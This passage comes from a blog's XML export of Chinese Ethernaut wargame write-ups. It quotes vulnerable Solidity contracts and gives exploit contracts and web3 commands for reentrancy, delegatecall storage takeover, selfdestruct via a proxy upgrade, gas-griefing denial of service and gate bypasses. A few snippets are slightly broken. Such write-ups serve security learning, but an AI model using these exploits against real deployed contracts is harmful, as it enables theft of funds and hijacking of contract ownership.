web3.eth.abi.encodeFunctionCall(functionSignature, params)await web3.eth.sendTransaction({from: player, to: instance, data})</code></pre><p>在将自己加入白名单。</p><pre class=" language-1"><code class="language-1">await contract.proposeNewAdmin(player)</code></pre><p>要修改maxBalance，就需要使合约余额清0。我们看multicall函数，它的作用是同时进行多次函数调用，但是deposit函数除外。由于这里使用了selector来比较，那么我们只需要换个方式调用deposit函数即可绕过。我们可调用deposit和multicall(deposit)。</p><pre class=" language-1"><code class="language-1">depositData = await contract.methods["deposit()"].request().then(v => v.data)multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)await contract.multicall([depositData, multicallData], {value: toWei('0.001')})await contract.execute(player,toWei('0.002'),0x0)</code></pre><p>设定maxBalance</p><pre class=" language-1"><code class="language-1">await contract.setMaxBalance(player)</code></pre><h2 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h2><p>本题要求我们去使engine合约自毁。</p><p>因为整个合约中都没有 selfdestruct，所以要upgradeToAndCall函数更新合约。需要通过 _authorizeUpgrade 函数的检查。这个可以通过 initialize 函数完成。</p><pre class=" language-1"><code class="language-1">> await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")'0x000000000000000000000000<engine address>'> engine = "0x<engine address>"> data = web3.utils.sha3("initialize()").slice(0, 10)'0x8129fc1c'> web3.eth.sendTransaction({from: player, to: engine, data: data})> await web3.eth.call({from: player, to: engine, data: web3.utils.sha3("upgrader()").slice(0, 10)}) // 验证 upgrader'0x000000000000000000000000<player address>'> exp = "<Exploit contract address>"> expdata = web3.utils.sha3("exp()").slice(0, 10)'0xab60ffda'> signature = {    name: 'upgradeToAndCall',    type: 'function',    inputs: [        {            type: 'address',            name: 'newImplementation'        },        {            type: 'bytes memory',            name: 'data'        }    ]}{name: 'upgradeToAndCall', type: 'function', inputs: Array(2)}> data = web3.eth.abi.encodeFunctionCall(upgradeSignature, [exp, expdata])'0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000'> web3.eth.sendTransaction({from: player, to: engine, data: data})</code></pre><pre class=" language-1"><code class="language-1">pragma solidity ^0.6.0;contract Exploit {    function exp() public {        selfdestruct(payable(0));    }}</code></pre><h2 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h2><p>本题要求我们写一个合约来维护它。</p><p>CryptoVault：提供一个sweepToken方法，允许任何人转代币。该函数内部的唯一检查是，你不能转移Vault的underlying代币。underlying代币DoubleEntryPoint。</p><p>LegacyToken.sol：它有一个transfer函数，当delegate不为0是调用delegate.delegateTransfer(to, value, msg.sender);delegate就是DoubleEntryPoint合约。</p><p>漏洞很明显sweepToken 只阻止了 底层 DoubleEntryPoint 的转账。但我们可以通过LegacyToken.transfer1取。</p><pre class=" language-1"><code class="language-1">function exploitLevel() internal override {    vm.startPrank(player, player);    DetectionBot bot = new DetectionBot(        level.cryptoVault(),        abi.encodeWithSignature("delegateTransfer(address,uint256,address)")    );    monitor the `DoubleEntryPoint` contract    level.forta().setDetectionBot(address(bot));    vm.stopPrank();}</code></pre><h2 id="Good-Samaritan"><a href="#Good-Samaritan" class="headerlink" title="Good Samaritan"></a>Good Samaritan</h2><p>本题要求我们取完Wallet中的coin。</p><p>想要取完，就要调用transferRemainder。由我们自己直接调用肯定是行不通的。但我们看requestDonation函数，会执行donate10函数，当执行失败后，会检测错误，若为NotEnoughBalance()，就会调transferRemainder。那如何做呢？ if (coin.balances(address(this)) &lt; 10)此条件明显办不到。我们看这一串代码。</p><pre class=" language-1"><code class="language-1">      if(dest_.isContract()) {                // notify contract                 INotifyable(dest_).notify(amount_);            }</code></pre><p>当dest_为合约是会调用它的notify函数。</p><p>到这思路已经清晰了。用合约调requestDonation函数，在notify函数中报错，返回<br>NotEnoughBalance()。</p><pre class=" language-1"><code class="language-1">pragma solidity >=0.8.0 <0.9.0;contract attack {    uint256 number=100;     error NotEnoughBalance();     function notify(uint256 amount) external{         if(amount<number){               revert NotEnoughBalance();         }     }}</code></pre><h2 id="Gatekeeper-Three"><a href="#Gatekeeper-Three" class="headerlink" title="Gatekeeper Three"></a>Gatekeeper Three</h2><p>本题要求我们通过3个gates，成为entrant。</p><p>gateone: 这个我们可以让过度合约成为owner在通过调过度合约去绕过。要想成为owner,就要通过construct0r函数（额，有点小丑）。</p><p>gatetwo：这个也很简单，只要用合约跟它交互，就可以得到password。也可以用web3.js直接查。</p><p>gatethree：这个也简单，在owner中的收款函数中加个revert让交易回滚就行。</p><p>得到pass2word。</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract getpassword {    SimpleTrick public trick ;    constructor (address  _target) {        trick = SimpleTrick(_target);    }    uint public passwords;    function att(uint _passwords) public {        passwords =  block.timestamp;        trick.checkPassword(_passwords);    }}</code></pre><pre class=" language-1"><code class="language-1">contract attack{     GatekeeperThree public target;     constructor (address payable _target) {        target = GatekeeperThree(_target);  }     function passone() public {        target.construct0r();    }     function passtwo(uint number) public {         target.getAllowance(number);     }     function attack () public {         target.enter();     }     receive() external payable {       revert();    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut题解——摘录(中)</title>
      <link href="/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%AD)/"/>
      <url>/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%AD)/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut题解——摘录-中"><a href="#Ethernaut题解——摘录-中" class="headerlink" title="Ethernaut题解——摘录(中)"></a>Ethernaut题解——摘录(中)</h1><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Preservation {  // public library contracts   address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  // Sets the function signature for delegatecall  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {    timeZone1Library = _timeZone1LibraryAddress;     timeZone2Library = _timeZone2LibraryAddress;     owner = msg.sender;  }   // set the time for timezone 1  function setFirstTime(uint _timeStamp) public {    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }  // set the time for timezone 2  function setSecondTime(uint _timeStamp) public {    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }}// Simple library contract to set the timecontract LibraryContract {  // stores a timestamp   uint storedTime;    function setTime(uint _time) public {    storedTime = _time;  }}</code></pre><p>目标是拿到合约的所有权。但是从题目合约中看不到任何和更改 owner 有关的函数。<br>本题的关键点在于delegatecall。</p><p>通过delegatecall来调用另一个合约的函数并不会动用另一个合约的storage，而是使用本地storage。这就导致了在 setFirstTime函数中调用setTime函数时更改storedTime实际上会更改处于storage中相同位置timeZone1Library。这样在下一次调用setFirstTime的时候就会调用另一个地址合约的setTime函数。<br>因此可以部署一个攻击合约，其中实现 setTime 函数，里面将 owner 改为输入（注意要将攻击合约的内存布局搞的和 Preservation 合约相同）</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Exploit {    address public timeZone1Library;    address public timeZone2Library;    address public owner;             // 保证这前面有两个 address    function setTime(uint _time) public {        owner = address(_time);    }}</code></pre><h2 id="recovery"><a href="#recovery" class="headerlink" title="recovery"></a>recovery</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Recovery {  //generate tokens  function generateToken(string memory _name, uint256 _initialSupply) public {    new SimpleToken(_name, msg.sender, _initialSupply);    }}contract SimpleToken {  string public name;  mapping (address => uint) public balances;  // constructor  constructor(string memory _name, address _creator, uint256 _initialSupply) {    name = _name;    balances[_creator] = _initialSupply;  }  // collect ether in return for tokens  receive() external payable {    balances[msg.sender] = msg.value * 10;  }  // allow transfers of tokens  function transfer(address _to, uint _amount) public {     require(balances[msg.sender] >= _amount);    balances[msg.sender] = balances[msg.sender] - _amount;    balances[_to] = _amount;  }  // clean up after ourselves  function destroy(address payable _to) public {    selfdestruct(_to);  }}</code></pre><p>题意是instance调用 generateToken生成了一个 SimpleToken，但是不知道生成的合约地址，现在要调用这个合约的selfdestruct来将其中余额转到player账户中。<br>因为区块链都是透明的，可以直接去Etherscan的Rinkeby网络中查找。<br>所以写一个攻击合约来调用那个地址上的的destroy函数就好了</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract attack {    address payable target;    address payable myaddr;    constructor(address payable _addr, address payable _myaddr) public {        target=_addr;        myaddr=_myaddr;    }    function exploit() public{        target.call(abi.encodeWithSignature("destroy(address)",myaddr));    }}</code></pre><h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.5.0;import '../helpers/Ownable-05.sol';contract AlienCodex is Ownable {  bool public contact;  bytes32[] public codex;  modifier contacted() {    assert(contact);    _;  }    function make_contact() public {    contact = true;  }  function record(bytes32 _content) contacted public {    codex.push(_content);  }  function retract() contacted public {    codex.length--;  }  function revise(uint i, bytes32 _content) contacted public {    codex[i] = _content;  }}</code></pre><p>题目要求拿到合约的所有权。</p><p>这有跟内存有关。这个owner的存储是在Ownable中定义的，它会和contac一起放在 storage的slot0处。</p><p>由于还没有往数组里写东西，所以slot1为0。</p><p>整体思路就是，通过record函数往动态数组里写东西，算出可以覆盖的i值，然后覆盖掉就可以了。</p><p>因为codex[i] 实际上是表示keccak256(slot of codex)+i处，所以只要令i=2<em>256-keccak2</em>56(slot of codex)就可以使其变为2<strong>256，即溢出到0的位置<br>而codex的slot就是1，所以只需要计算2</strong>256-keccak256(1)。</p><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Denial {    address public partner; // withdrawal partner - pay the gas, split the withdraw    address public constant owner = address(0xA9E);    uint timeLastWithdrawn;    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public {        partner = _partner;    }    // withdraw 1% to recipient and 1% to owner    function withdraw() public {        uint amountToSend = address(this).balance / 100;        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call{value:amountToSend}("");        payable(owner).transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = block.timestamp;        withdrawPartnerBalances[partner] +=  amountToSend;    }    // allow deposit of funds    receive() external payable {}    // convenience function    function contractBalance() public view returns (uint) {        return address(this).balance;    }}</code></pre><p>目的是要阻止owner在withdraw的时候提取到资产。</p><p>如果在调用call函数时没有检查返回值，也没有指定gas，外部调用是一个gas消耗很高的操作的话，就会使得整个交易出现out of gas的错误，交易回滚。</p><p>因此我们有2个方法。，一种是我们可以通过一个循环，来达到耗尽gas的目的。<br>另外一种方式是，可以使用assert函数，这个函数和require比较像，用来做条件检查，assert的特点是当参数为false时，会消耗掉所有的gas。</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Exploit {    Denial challenge;    constructor(address payable addr) public {        challenge = Denial(addr);    }    function exp() public {        challenge.setWithdrawPartner(address(this));        challenge.withdraw();    }    receive() external payable {        assert(false);    }}</code></pre><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;interface Buyer {  function price() external view returns (uint);}contract Shop {  uint public price = 100;  bool public isSold;  function buy() public {    Buyer _buyer = Buyer(msg.sender);    if (_buyer.price() >= price && !isSold) {      isSold = true;      price = _buyer.price();    }  }}</code></pre><p>很明显的逻辑漏洞。</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Exploit {    Shop challenge;    constructor(address addr) public {        challenge = Shop(addr);    }    function price() public returns (uint256) {        if (challenge.isSold()) {            return 90;        }        return 100;    }    function exp() public {        challenge.buy();    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut题解——摘录（上）</title>
      <link href="/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%8A)/"/>
      <url>/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%8A)/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut题解摘录"><a href="#Ethernaut题解摘录" class="headerlink" title="Ethernaut题解摘录"></a>Ethernaut题解摘录</h1><h2 id="vault"><a href="#vault" class="headerlink" title="vault"></a>vault</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Vault {  bool public locked;  bytes32 private password;  constructor(bytes32 _password) {    locked = true;    password = _password;  }  function unlock(bytes32 _password) public {    if (password == _password) {      locked = false;    }  }}</code></pre><p>要 unlock 这个合约账户，也就是要找到 password。虽然 password 被设为了 private，但是以太坊部署和合约上所有的数据都是可读的，包括这里合约内定义为private类型的password变量。，所以只要 getStorageAt 就可以了。</p><pre class=" language-l"><code class="language-l">await web3.eth.getStorageAt(instance, 1)// 0 为 locked 的位置，1 为 password</code></pre><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract King {  address king;  uint public prize;  address public owner;  constructor() payable {    owner = msg.sender;      king = msg.sender;    prize = msg.value;  }  receive() external payable {    require(msg.value >= prize || msg.sender == owner);    payable(king).transfer(msg.value);    king = msg.sender;    prize = msg.value;  }  function _king() public view returns (address) {    return king;  }}</code></pre><p>很明显可以通过看到receive函数中只要我们满足require的条件，就可以篡改合约的king。而题目说明中告知，当我们submit instance 时本关会尝试回收“王权”，也就是它会传入一个更大的msg.value，修改king为原来的msg.sender，为了阻止这一点，我们可以通过在合约的receive或者fallback函数中加入revert函数来实现。</p><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Exploit {    constructor(address challenge) public payable {        challenge.call.gas(10000000).value(msg.value)("");    }    fallback() external {        revert();    }}</code></pre><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.6.12;import 'openzeppelin-contracts-06/math/SafeMath.sol';contract Reentrance {    using SafeMath for uint256;  mapping(address => uint) public balances;  function donate(address _to) public payable {    balances[_to] = balances[_to].add(msg.value);  }  function balanceOf(address _who) public view returns (uint balance) {    return balances[_who];  }  function withdraw(uint _amount) public {    if(balances[msg.sender] >= _amount) {      (bool result,) = msg.sender.call{value:_amount}("");      if(result) {        _amount;      }      balances[msg.sender] -= _amount;    }  }  receive() external payable {}}</code></pre><p>经典的重入漏洞。<br>原因是call函数它没有gas的限制。</p><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract attack {    address payable target;    address payable public owner;    uint amount = 1000000000000000 wei;    constructor(address payable _addr) public payable {        target=_addr;        owner = msg.sender;    }    function step1() public payable{        bool b;        (b,)=target.call{value: amount}(abi.encodeWithSignature("donate(address)",address(this)));        require(b,"step1 error");    }    function setp2() public payable {        bool b;        (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));        require(b,"step2 error");    }    fallback () external payable{        bool b;        (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));        require(b,"fallback error");    }    function mywithdraw() external payable{        require(msg.sender==owner,'not you');        msg.sender.transfer(address(this).balance);    }}</code></pre><h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract GatekeeperOne {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    require(gasleft() % 8191 == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),"");      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "");      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "");    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><p>msg.sender != tx.origin：即通过一个合约来间接调用 enter。<br>gasleft() % 8191 == 0：运行到这一步时剩余的 gas 要是 8191 的倍数。<br>输入的 _gateKey 满足三个条件。<br>第一个好办，直接写一个合约绕过就好。<br>第二个我是直接是爆破x，因为gas消耗总归是有个范围的，我们只需要在这个范围内爆破即可。</p><pre class=" language-l"><code class="language-l">function exploit() public {        bytes8 key=0xAAAAAAAA00004261;        bool result;        for (uint256 i = 0; i < 120; i++) {            (bool result, bytes memory data) = address(                target            ).call{gas:i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));            if (result) {                break;            }        }</code></pre><p>第三个是一个简单的类型转换。<br><a href="https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256">https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256</a>.</p><h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract GatekeeperTwo {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    uint x;    assembly { x := extcodesize(caller()) }    require(x == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))     ^ uint64(_gateKey) == type(uint64).max);    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><p>第一个同样通过合约绕过解决。<br>第二个，其中caller()函数返回call sender，也就是call的发起者，而extcodesize则是返回对应地址的合约代码的大小。如果extcodesize的参数是用户地址则会返回0，是合约地址则返回了调用合约的代码大小。关于这点，需要使用一个特性绕过：当合约正在执行构造函数constructor并部署时，其extcodesize为0。<br>所以攻击代码要写在 constructor 里。<br>第三个，这是一个简单的异或。<br>例子：如果A^B=C;那B^C=A；</p><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Exploit {    GatekeeperTwo challenge;    constructor(address addr) public {        challenge = GatekeeperTwo(addr);        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this))))         ^ uint64(0xFFFFFFFFFFFFFFFF);        challenge.enter(bytes8(key));    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
